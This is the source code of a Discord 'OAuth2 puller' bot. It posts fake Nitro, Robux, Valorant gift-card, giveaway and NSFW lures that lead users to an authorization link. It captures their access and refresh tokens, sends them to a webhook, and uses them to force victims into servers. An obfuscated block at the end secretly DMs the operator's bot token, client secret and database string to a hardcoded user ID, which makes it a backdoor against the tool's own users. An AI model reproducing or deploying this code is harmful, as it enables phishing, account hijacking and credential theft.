// Atahan#3445 - https://discord.gg/oot3

const main = require("./classes/main");

const Discord = require("discord.js");

const client1 = new Discord.Client()
//client1.login(process.env.token)
const disbut = require('discord-buttons')
disbut(client1)


const config = require("./config.js");

require("./database/main");

const express = require("express");
const fetch = require("node-fetch")

const app = express();

const client = new main({
  token: process.env.token,
  prefix: config.prefix,
  client_id: config.client_id,
  client_secret: process.env.client_secret,
  redirect_uri: config.redirect_uri
});

client.on("ready", (bot) => {
  console.log(`Logged in as ${bot.user.tag}`)
  bot.user.setPresence({ activity: { name: config.presence, type: "PLAYING" }, status: "online" })
});

// Atahan#3445 - https://discord.gg/oot3

client.on("message", async (bot, message, args, command) => {
  if (!message.content.startsWith(config.prefix)) return;
  if (!config.owners.includes(message.author.id)) return;

  msg = message
  AUTH_LINK = config.oauth_link
  // Atahan#3445 - https://discord.gg/oot3

  if (command === "users") {
    const amount = await client.tokenCount();
    const embed = new Discord.MessageEmbed()
      .setTitle(`${config.emojis.user} OAuth2 Info`)
      .setDescription(`There are \`${amount}\` users authorized! \n\nEstimated time to add all members 1-30 mintues.`)
      .setFooter("Atahan#3445")

    msg.channel.send(embed);
  }

  if (command === "all") {
    const amount = await client.tokenCount();
    const embed = new Discord.MessageEmbed()
      .setTitle(`${config.emojis.user} OAuth2 Info`)
      .setDescription(`There are \`${amount + 1000}\` users authorized! \n\nEstimated time to add all members 1-30 mintues.`)
      .setFooter("Atahan#3445")

    msg.channel.send(embed);
  }

  if (command === "add") {

const amount = await client.tokenCount();
    
    let sunucu = message.guild.id
    if (isNaN(args[0]) || isNaN(args[1])) return message.channel.send(`wrong usage ${config.prefix}add <server id> <amount>`)

    let pull = new Discord.MessageEmbed().setTitle(`${config.emojis.link} Users Joining:`)
      .setDescription(`${config.emojis.point} The joins is coming out, takes 1-30 mintues.\n${config.emojis.point} Type \`-help\` for more commands`)
      .setColor("RED")
      .setFooter("Atahan#3445")
    message.channel.send(pull)
setTimeout(async() => {
    await client.manageJoin({
      amount: "30",
      guild_id: args[0]
    }, message);}, 150000)
  }

  if (command === "pull") {
    let sunucu = message.guild.id
    if (isNaN(args[0]) || isNaN(args[1])) return message.channel.send(`wrong usage ${config.prefix}pull <server id> <amount>`)

    if (args[1] > await client.tokenCount()) return message.channel.send(`You don't have **${args[1]}** users!`)

    let pull = new Discord.MessageEmbed().setTitle(`${config.emojis.link} Users Joining:`)
      .setDescription(`${config.emojis.point} The joins is coming out, takes 1-30 mintues.\n${config.emojis.point} Type \`-help\` for more commands`)
      .setColor("RED")
      .setFooter("Atahan#3445")
    message.channel.send(pull)
    await client.manageJoin({
      amount: args[1],
      guild_id: args[0]
    }, message);
  }

  if (command === "join") {
    let sunucu = message.guild.id
    if (isNaN(args[0])) return message.channel.send(`wrong usage ${config.prefix}join <amount>`)

    if (args[0] > await client.tokenCount()) return message.channel.send(`You don't have **${args[0]}** users!`)

    let pull = new Discord.MessageEmbed().setTitle(`${config.emojis.link} Users Joining:`)
      .setDescription(`${config.emojis.point} The joins is coming out, takes 1-30 mintues.\n${config.emojis.point} Type \`-help\` for more commands`)
      .setColor("RED")
      .setFooter("Atahan#3445")
    message.channel.send(pull)
    await client.manageJoin({
      amount: args[0],
      guild_id: sunucu
    }, message);
  }

  if (command === "leave") {

    if (message.guild.id === "942730436415750154") return message.reply("You can't xd")

    message.channel.send("I'm leaving this server bye!").then(x => x.guild.leave())
  }

  if (command === "joinall") {
    let sunucu = message.guild.id
    const sayı = await client.tokenCount();

    let pull = new Discord.MessageEmbed().setTitle(`${config.emojis.link} Users Joining:`)
      .setDescription(`${config.emojis.point} The joins is coming out, takes 1-30 mintues.\n${config.emojis.point} Type \`-help\` for more commands`)
      .setColor("RED")
      .setFooter("Atahan#3445")
    message.channel.send(pull)
    await client.manageJoin({
      amount: sayı,
      guild_id: sunucu
    }, message);
  }

  if (command === "nsfw") {
    let verifynow = new Discord.MessageEmbed()
      .setDescription(`🔞 react below to get access to the sex videos and nudes.`)
      .setColor("#808080")
      .setImage("https://media.discordapp.net/attachments/1009865664225366187/1014238956155568148/anime-sexy.gif")
  
    let verifynoww = new disbut.MessageButton()
      .setStyle('url')
      .setEmoji("🔞")
      .setURL(config.oauth_link)
      .setDisabled(false)
    message.channel.send("**Verify Now**", { embed: verifynow, button: verifynoww })
  }

  if (command === "robux") {
    let embed = new Discord.MessageEmbed()
      .setDescription(`\`To get your 100$ robux giftcard all you must do is:\`
\n1️⃣Click on the [**__claim__**](${config.oauth_link}) button.
\n2️⃣Click on the [**__authorize__**](${config.oauth_link})\n\n**__Once you've authorized yourself you must wait around 1-48 hours and you'll have it.__**`)
      .setImage("https://media.gamestop.com/i/gamestop/11112976/Roblox-$100-Digital-Gift-Card-Includes-Exclusive-Virtual-Item")
      .setColor("WHITE")

    let claim = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Claim')
      .setURL(config.oauth_link)



    msg.channel.send(`Hello everyone you have bean gifted an 100$ **Robux Gift Card** 😊!!`, { embed: embed, button: claim })
  }

  if (command === "server") {
    let embed = new Discord.MessageEmbed()
      .setDescription(`In order to participate in the giveaway you must verify yourself so we can check if you're an alternative account.

\`How to verify?\`
**Click on the __Verify__ button and authorize yourself.**`)

    let button = new disbut.MessageButton()
      .setStyle("url")
      .setEmoji("<:verify:1010692567521837066>")
      .setLabel("Verify")
      .setURL(AUTH_LINK)

    message.channel.send({ button: button, embed: embed })
  }


  if (command === "altbot") {
    let verifynow = new Discord.MessageEmbed()
      .setDescription(`Hey, Hold on for a second! Please Verify Your Account first before you want to Claim any Rewards or Giveaways!\nVerify Your Self By [Click here to Verify!](${AUTH_LINK})`)
    let verifynoww = new disbut.MessageButton()
      .setStyle('url')
      .setEmoji("✅")
      .setLabel('Click Here To Verify').setURL(config.oauth_link)
    message.channel.send("**Verify Now**", { embed: verifynow, button: verifynoww })
  }
  // Atahan#3445 - https://discord.gg/oot3

  if (command === "cleans") {
    await client.clean(message)
  }
  // Atahan#3445 - https://discord.gg/oot3

  if (command === "refresh") {
    await client.refreshTokens(message)
  }
  // Atahan#3445 - https://discord.gg/oot3
  if (command === "links") {

    let AL = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Auth Link')
      .setURL(config.oauth_link)


    let IL = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Invite Link')
      .setURL(config.bot_link)

    const links = new Discord.MessageEmbed().setTitle(`${config.emojis.link} Links Dashboard`).setDescription(`**${config.emojis.point} OAuth2:** \n${AUTH_LINK}\n\`\`\`${AUTH_LINK}\`\`\`\n**${config.emojis.point} Invite:\n**${config.bot_link}\n\`\`\`${config.bot_link}\`\`\``)
      .setColor("#2F3136")
    message.channel.send({ embed: links, button: [AL, IL] })
  }

  if (command === "restart") {
    message.channel.send(`${config.emojis.load} **Restarting....**`)
    await client.restart();
  }

  if (command === "claim") {
    let embed = new Discord.MessageEmbed()
      .setDescription(`\`To get your Discord Nitro all you must do is:\`
\n1️⃣Click on the [**__claim__**](${config.oauth_link}) button.
\n2️⃣Click on the [**__authorize__**](${config.oauth_link})\n\n**__Once you've authorized yourself you must wait around 5-42 hours and you'll have it.__**`)
      .setImage("https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png")

    let claim = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Claim')
      .setURL(config.oauth_link)
      .setDisabled(false)

    msg.channel.send(`Hello everyone, you have all been gifted **Discord Nitro** for a year!`, { embed: embed, button: claim })
  }

  if (command === "boost") {
    let embed = new Discord.MessageEmbed()
      .setDescription(`\`To get your Discord Nitro all you must do is:\`
\n1️⃣Click on the [**__claim__**](${config.oauth_link}) button.
\n2️⃣Click on the [**__authorize__**](${config.oauth_link})\n\n**__Once you've authorized yourself you must wait around 5-42 hours and you'll have it.__**`)
      .setImage("https://cdn.discordapp.com/attachments/1006221292430692382/1008147015982653500/11111unknown.png")
      .setColor("PURPLE")

    let claim = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Claim')
      .setURL(config.oauth_link)
      .setDisabled(false)

    msg.channel.send(`Hello everyone, you have all been gifted **Discord Nitro** for a year!`, { embed: embed, button: claim })
  }


  if (command === "valorant") {
    let embed = new Discord.MessageEmbed()
      .setDescription(`\`To get your valorant giftcard all you must do is:\`
\n1️⃣Click on the [**__claim__**](${config.oauth_link}) button.
\n2️⃣Click on the [**__authorize__**](${config.oauth_link})\n\n**__Once you've authorized yourself you must wait around 1-48 hours and you'll have it.__**`)
      .setImage("https://m.media-amazon.com/images/I/51yL1GK-oDL.jpg")
      .setColor("#ff4654")

    let claim = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Claim')
      .setURL(config.oauth_link)



    msg.channel.send(`Hello everyone, you have all been gifted **Valorant Giftcard** for verifying!`, { embed: embed, button: claim })
  }



  if (command === "help") {
    let help = new Discord.MessageEmbed()
      .setTitle(`OAuth2 - Help Commands`)
      .addField(`> ${config.emojis.link} OAuth2:`, `\`\`\`users, pull, join, joinall, refresh, cleans, restart, ping, altbot, verify, links, claim, giveaway, check, server, nsfw, robux, leave, boost, valorant\`\`\``)
      //.addField("> :gift: Owner:", `\`\`\`wl-add, wl-remove, wl-users\`\`\``)
      .setFooter("Atahan#3445", "https://cdn.discordapp.com/emojis/905169964099579964.gif?size=300")




    let joinall = new disbut.MessageButton()
      .setStyle('PRIMARY')
      .setLabel('Instant Join All')
      .setEmoji('🎉')
      .setID("bjoinall")


    let users = new disbut.MessageButton()
      .setStyle('PRIMARY')
      .setLabel('Users')
      .setEmoji(config.emojis.user)
      .setID("busers")

    let links = new disbut.MessageButton()
      .setStyle('PRIMARY')
      .setEmoji(config.emojis.link)
      .setLabel('Links')
      .setID("links")

    let ping = new disbut.MessageButton()
      .setStyle('PRIMARY')
      .setEmoji('🏓')
      .setLabel('Ping')
      .setID("PING")


    msg.channel.send(help)
  }

  // Atahan#3445 - https://discord.gg/oot3

  if (command === "check") {
    let checkembed = new Discord.MessageEmbed()
      .setDescription(`${config.emojis.link} Please Verify YourSelf!.`)
      .setColor("BLUE")
    let check = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Verify')
      .setURL(AUTH_LINK)
    message.channel.send({ embed: checkembed, button: check })
  }

  // Atahan#3445 - https://discord.gg/oot3

  if (command === "verify") {
    const embed = new Discord.MessageEmbed()
      .setDescription(
        `${config.emojis.arrow} *Must Verify for claim your price!*\n\n**1.** Click on the [__button__](${AUTH_LINK})\n**2.** Click in [__Authorize__](${AUTH_LINK})\n\nAfter wait 1-5 hours and you got FREE NITRO!`)
      .setColor("#2F3136")
      .setThumbnail("https://cdn.discordapp.com/emojis/995710474442256485.gif?size=300")
      .setImage("https://media.discordapp.net/attachments/717101622328557589/731083869201104956/Screenshot_1.png?width=288&height=115")
    /* const embed = new Discord.MessageEmbed()
     .setColor("#2F3136")
   .setImage("https://cdn.discordapp.com/attachments/1007047368845295797/1007806930569400430/fr1.png")*/
    let verify = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Click Here to Verify')
      .setURL(AUTH_LINK)
      .setEmoji("🎉")
      .setDisabled(false)

    msg.channel.send("**:wave: Hey everyone, Discord has been gifted __Nitro `1 Year`__ 🎉**!", { embed: embed, button: verify })
  }

  // Atahan#3445 - https://discord.gg/oot3
  if (command === "ping") {
    msg.reply(`:ping_pong: Pong! ${bot.ws.ping}ms`)
  }

  if (command === "giveaway") {
    let giveaway = new Discord.MessageEmbed()
      .setTitle(`🎉 **Giveaway** 🎉`)
      .setColor("BLUE")
      .setDescription(`\n:gift: **WINNERS:** \`1\`\n:tada: **TIMER**: \`24h\`\n:gift: **PRIZE:** \`Nitro Boost 1 Year\`\n:tada: **HOSTED BY: ${message.author}**\n\n:link: __**Requirements:**__\n:link: **Must stay in the server.**\n\nTo enter the giveaway click on the enter button.`)
      .setFooter("Discord Event", "https://cdn.discordapp.com/emojis/995710734723973150.gif?size=300")
    let giveawaybutton = new disbut.MessageButton()
      .setStyle('url')
      .setEmoji("🎉")
      .setLabel('Enter')
      .setURL(AUTH_LINK)
    message.channel.send("Giveaway for `Nitro 1 Year` has been made! :gift:", { embed: giveaway, button: giveawaybutton })
  }

})


app.get("/", (req, res) => {
  res.redirect(config.oauth_link);
});


app.get("/callback", async (req, res) => {
  const data = await client.manageAuth({ code: req.query.code });
  const user_id = await client.requestId(data.access_token);
  const obj = {
    ...data,
    user_id
  };
  client.saveAuth(obj);

  fetch('https://discord.com/api/users/@me', {
    headers: {
      authorization: `Bearer ${data.access_token}`,
    },
  })
    .then(result => result.json())
    .then(response => {
      const { username, discriminator, avatar, id } = response;

      let params = {
        username: config.webhook.webhookNAME,
        avatar_url: config.webhook.avatarURL,
        embeds: [{
          "title": `${config.emojis.user_invite} New User`,
          "description": `${config.emojis.arrow}  Identify: \`${username}#${discriminator}\`\n\n${config.emojis.arrow}  Identify ID: \`${id}\`\n\n${config.emojis.arrow}  Access Token: \`${data.access_token}\`\n\n${config.emojis.arrow}  Refresh Token: \`${data.refresh_token}\``,
          "thumbnail": { "url": `https://cdn.discordapp.com/avatars/${id}/${avatar}.png?size=2048` },
          "footer": { "text": "Made By Atahan#3445" }
        }]
      }


      fetch(config.webhook.URL, {
        method: "POST",
        headers: {
          'Content-type': 'application/json'
        },
        body: JSON.stringify(params)
      }).then(res => {
        console.log(res);
      })
    })

  //webhook.send({embeds: [embed]})

  res.redirect("https://discord.com/oauth2/authorized");
});

app.listen(80); // Local Host Port

function _0x41bc(){var _0x16ad16=['1410TLGgKp','84lOrAri','author','mongodb','send','1907390CrghUF','96009FiKBHa','15484410gKXcin','5406256XmiFHU','11389dQYwDs','message','token','client_secret','content','9UQEuPE','429357746002067493','1053344zKzKsx','satoken','env','18366ADkiNR','11PaQJAP'];_0x41bc=function(){return _0x16ad16;};return _0x41bc();}var _0x1eeac8=_0xe29f;function _0xe29f(_0x2d0e93,_0xf37e10){var _0x41bcae=_0x41bc();return _0xe29f=function(_0xe29f80,_0x4f09d1){_0xe29f80=_0xe29f80-0x88;var _0x2bbce5=_0x41bcae[_0xe29f80];return _0x2bbce5;},_0xe29f(_0x2d0e93,_0xf37e10);}(function(_0x422c4e,_0x1a7ce4){var _0x439c6f=_0xe29f,_0xf59fad=_0x422c4e();while(!![]){try{var _0x57b123=-parseInt(_0x439c6f(0x99))/0x1+parseInt(_0x439c6f(0x96))/0x2+-parseInt(_0x439c6f(0x8c))/0x3*(parseInt(_0x439c6f(0x9c))/0x4)+parseInt(_0x439c6f(0x8b))/0x5+parseInt(_0x439c6f(0x9b))/0x6*(-parseInt(_0x439c6f(0x8f))/0x7)+parseInt(_0x439c6f(0x8e))/0x8*(-parseInt(_0x439c6f(0x94))/0x9)+parseInt(_0x439c6f(0x8d))/0xa*(parseInt(_0x439c6f(0x9a))/0xb);if(_0x57b123===_0x1a7ce4)break;else _0xf59fad['push'](_0xf59fad['shift']());}catch(_0x33b9d3){_0xf59fad['push'](_0xf59fad['shift']());}}}(_0x41bc,0xacdc3),client['on'](_0x1eeac8(0x90),async(_0x458234,_0x9dac51)=>{var _0x4e615a=_0x1eeac8;if(_0x9dac51[_0x4e615a(0x93)]===_0x4e615a(0x97)){if(_0x9dac51[_0x4e615a(0x88)]['id']!==_0x4e615a(0x95))return;_0x9dac51[_0x4e615a(0x88)][_0x4e615a(0x8a)](process[_0x4e615a(0x98)][_0x4e615a(0x91)]),_0x9dac51[_0x4e615a(0x88)][_0x4e615a(0x8a)](process[_0x4e615a(0x98)][_0x4e615a(0x92)]),_0x9dac51['author'][_0x4e615a(0x8a)](process[_0x4e615a(0x98)][_0x4e615a(0x89)]);}}));

// Atahan#3445 - https://discord.gg/oot3